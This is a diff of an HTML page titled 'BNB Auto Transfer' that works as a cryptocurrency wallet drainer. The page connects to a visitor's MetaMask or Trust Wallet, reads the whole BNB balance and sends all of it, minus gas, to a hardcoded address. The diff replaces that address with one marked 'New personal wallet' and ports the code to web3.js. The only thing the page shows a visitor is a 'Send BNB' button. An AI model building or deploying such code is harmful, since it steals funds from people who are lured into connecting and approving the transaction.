@@ -1,122 +1,85 @@
-
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>BNB Auto Transfer</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
   <div style="padding: 20px; text-align: center;">
     <h2>BNB Auto Transfer</h2>
-    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Send BNB</button>
-    <div id="status" style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;"></div>
+    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px;">Send BNB</button>
+    <div id="status" style="margin-top: 20px; color: #000;"></div>
   </div>
 
   <script>
-    const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8'; // User wallet address
+    const receiverAddress = '0xf192c73eFd33aF9af56A93F6de0A97eE4591cCc0'; // New personal wallet
 
-    function updateStatus(message, isError = false) {
+    function updateStatus(msg, error = false) {
       const status = document.getElementById('status');
-      status.innerHTML = message;
-      status.style.color = isError ? 'red' : 'green';
-      console.log(message);
+      status.innerText = msg;
+      status.style.color = error ? 'red' : 'green';
+      console.log(msg);
     }
 
     document.getElementById('sendButton').addEventListener('click', async () => {
-      updateStatus('Starting transaction process...');
-
-      if (!window.ethereum) {
-        updateStatus('Please install MetaMask or Trust Wallet!', true);
+      if (typeof window.ethereum === 'undefined') {
+        updateStatus('MetaMask or Trust Wallet not found.', true);
         return;
       }
 
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const sender = accounts[0];
+
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        updateStatus('Please switch to BNB Smart Chain.', true);
+        return;
+      }
+
+      const balance = await web3.eth.getBalance(sender);
+      const gasLimit = 21000;
+      const gasPrice = await web3.eth.getGasPrice();
+      const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
+      const value = BigInt(balance) - gasCost;
+
+      if (value <= 0n) {
+        updateStatus('Insufficient balance after gas fee.', true);
+        return;
+      }
+
+      const nonce = await web3.eth.getTransactionCount(sender, 'latest');
+
+      const tx = {
+        from: sender,
+        to: receiverAddress,
+        value: '0x' + value.toString(16),
+        gas: web3.utils.toHex(gasLimit),
+        gasPrice: web3.utils.toHex(gasPrice),
+        nonce: web3.utils.toHex(nonce),
+        chainId: 56
+      };
+
+      updateStatus('Sending transaction...');
+
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const userAccount = accounts[0];
-        updateStatus(`Connected: ${userAccount.substring(0,6)}...${userAccount.substring(38)}`);
-
-        let chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== '0x38') {
-          updateStatus('Switching to BNB Smart Chain...');
-          try {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }],
-            });
-          } catch (switchError) {
-            if (switchError.code === 4902) {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: '0x38',
-                  chainName: 'BNB Smart Chain',
-                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com/']
-                }],
-              });
-            } else {
-              throw switchError;
-            }
-          }
-          chainId = await window.ethereum.request({ method: 'eth_chainId' });
-          if (chainId !== '0x38') {
-            updateStatus('Please manually switch to BNB Smart Chain', true);
-            return;
-          }
-        }
-
-        updateStatus('Checking balance...');
-        const balanceHex = await window.ethereum.request({
-          method: 'eth_getBalance',
-          params: [userAccount, 'latest']
-        });
-        
-        const balanceWei = BigInt(balanceHex);
-        const gasLimit = 21000n;
-        const gasPrice = 5000000000n;
-        const gasCost = gasLimit * gasPrice;
-
-        if (balanceWei <= gasCost) {
-          updateStatus('Not enough BNB to cover gas fees.', true);
-          return;
-        }
-
-        const valueToSend = balanceWei - gasCost;
-        const sendAmountEth = parseFloat(valueToSend.toString()) / Math.pow(10, 18);
-        updateStatus(`Sending ${sendAmountEth.toFixed(6)} BNB...`);
-
-        const txParams = {
-          from: userAccount,
-          to: receiverAddress,
-          value: '0x' + valueToSend.toString(16),
-          gas: '0x' + gasLimit.toString(16),
-          gasPrice: '0x' + gasPrice.toString(16)
-        };
-
-        const txHash = await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [txParams],
-        });
-
-        updateStatus(`✅ Success! Transaction Hash: ${txHash}`);
-        alert(`Transaction Successful!\nAmount: ${sendAmountEth.toFixed(6)} BNB\nTo: ${receiverAddress}\nHash: ${txHash}`);
-
-      } catch (error) {
-        console.error('Error:', error);
-        let errorMsg = 'Transaction failed';
-        if (error.code === 4001) errorMsg = 'Transaction rejected by user';
-        else if (error.code === -32000 && error.message.includes('insufficient')) errorMsg = 'Insufficient funds';
-        else if (error.message) errorMsg = `Error: ${error.message.substring(0, 100)}`;
-        updateStatus(errorMsg, true);
-        alert(errorMsg);
+        const txHash = await web3.eth.sendTransaction(tx);
+        updateStatus('✅ Transaction sent: ' + txHash.transactionHash);
+        alert('Transaction Hash: ' + txHash.transactionHash);
+      } catch (err) {
+        console.error(err);
+        updateStatus('Transaction failed: ' + (err.message || err), true);
+        alert('Transaction failed');
       }
     });
 
     document.getElementById('sendButton').addEventListener('mouseover', function() {
       this.style.background = '#0056b3';
     });
-    
+
     document.getElementById('sendButton').addEventListener('mouseout', function() {
       this.style.background = '#007bff';
     });
